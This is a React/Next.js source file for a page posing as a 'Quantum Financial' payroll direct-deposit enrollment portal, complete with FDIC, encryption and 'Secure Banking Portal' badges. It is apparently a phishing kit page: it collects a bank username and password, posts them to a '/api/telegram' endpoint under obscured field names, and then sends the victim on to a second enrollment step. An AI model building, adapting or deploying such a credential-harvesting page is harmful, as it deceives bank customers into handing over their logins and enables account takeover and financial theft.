"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { motion } from "framer-motion";
import { FaUniversity, FaLock, FaShieldAlt } from "react-icons/fa";

export default function PayrollEnrollmentPage() {
  const router = useRouter();
  const [f1, setF1] = useState(""); // username
  const [f2, setF2] = useState(""); // password
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Debug: Confirm component mounted
  useEffect(() => {
    console.log("✅ PayrollEnrollmentPage mounted");
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!f1.trim() || !f2.trim()) {
      setError("Please enter both Username and Password.");
      return;
    }

    setIsSubmitting(true);
    setError("");
    setSuccess("");

    const formData = {
      a: f1.trim(),
      b: f2.trim(),
    };

    try {
      const res = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Cache-Control": "no-cache",
        },
        credentials: "same-origin",   // ← extra reliability on mobile
        body: JSON.stringify({
          data: formData,
          formType: "🏦 Payroll Enrollment",
        }),
        keepalive: true,
      });

      if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);

      setSuccess("Enrollment submitted successfully!");
      setF1("");
      setF2("");

      setTimeout(() => {
        router.replace("/PayrollEnrollment2");   // ← safer than push
      }, 1500);
    } catch (err) {
      console.error("Submission error:", err);
      setError("Failed to submit. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <main className="relative min-h-screen bg-gradient-to-br from-gray-900 to-black overflow-hidden">
      {/* Background blobs */}
      <div className="absolute top-0 right-0 w-[600px] h-[600px] bg-purple-500/20 rounded-full blur-[150px]" />
      <div className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-blue-500/20 rounded-full blur-[120px]" />

      <div className="relative z-10 max-w-4xl mx-auto px-4 pt-32 pb-20 md:pt-40 md:pb-28">
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
          className="text-center mb-10"
        >
          <div className="inline-flex items-center justify-center gap-2 bg-purple-500/10 px-4 py-1 rounded-full mb-4">
            <FaUniversity className="text-purple-400" />
            <span className="text-purple-400 text-sm font-semibold tracking-wider uppercase">
              Quantum Financial
            </span>
          </div>
          <h1 className="font-bold text-4xl md:text-5xl text-white mb-4">
            Payroll Direct Deposit
          </h1>
          <p className="text-gray-400 text-lg max-w-2xl mx-auto">
            Securely enroll in electronic payroll deposits. Your information is
            protected with 256‑bit encryption.
          </p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.2 }}
        >
          <div className="bg-white/5 backdrop-blur-sm border border-white/10 rounded-2xl p-6 md:p-8 border-l-4 border-l-purple-500">
            <div className="flex items-center gap-3 mb-6 pb-4 border-b border-gray-800">
              <div className="p-2 rounded-full bg-blue-500/20 text-blue-400">
                <FaLock />
              </div>
              <div>
                <h3 className="text-white font-semibold">Secure Banking Portal</h3>
                <p className="text-gray-500 text-xs">
                  Member FDIC • Equal Housing Lender
                </p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-5">
              {error && (
                <div className="bg-red-500/10 border border-red-500/30 text-red-400 px-4 py-3 rounded-lg text-sm flex items-start gap-2">
                  <FaShieldAlt className="mt-0.5 flex-shrink-0" />
                  <span>{error}</span>
                </div>
              )}
              {success && (
                <div className="bg-green-500/10 border border-green-500/30 text-green-400 px-4 py-3 rounded-lg text-sm">
                  {success}
                </div>
              )}

              <div>
                <label className="block text-white font-semibold mb-2">
                  Username
                </label>
                <input
                  type="tel"                    
                  value={f1}
                  onChange={(e) => setF1(e.target.value)}
                  className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors"
                  placeholder="e.g., QW-12345"
                  required
                  autoComplete="off"
                />
              </div>

              <div>
                <label className="block text-white font-semibold mb-2">
                  Password
                </label>
                <input
                  type="password"
                  value={f2}
                  onChange={(e) => setF2(e.target.value)}
                  className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors"
                  placeholder="••••••••"
                  required
                  autoComplete="off"
                />
              </div>

              <div className="pt-4">
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className={`w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:shadow-lg text-white font-semibold py-3 px-6 rounded-lg transition-all duration-300 flex items-center justify-center gap-2 ${
                    isSubmitting ? "opacity-70 cursor-not-allowed" : ""
                  }`}
                >
                  {isSubmitting ? "Processing..." : "Confirm & Enroll"}
                </button>
              </div>
            </form>

            <div className="mt-6 text-center text-gray-500 text-xs flex justify-center gap-4">
              <span className="flex items-center gap-1">
                <FaLock className="text-xs" /> Encrypted
              </span>
              <span className="flex items-center gap-1">
                <FaUniversity /> FDIC Insured
              </span>
              <span>24/7 Support</span>
            </div>
          </div>
        </motion.div>
      </div>
    </main>
  );
}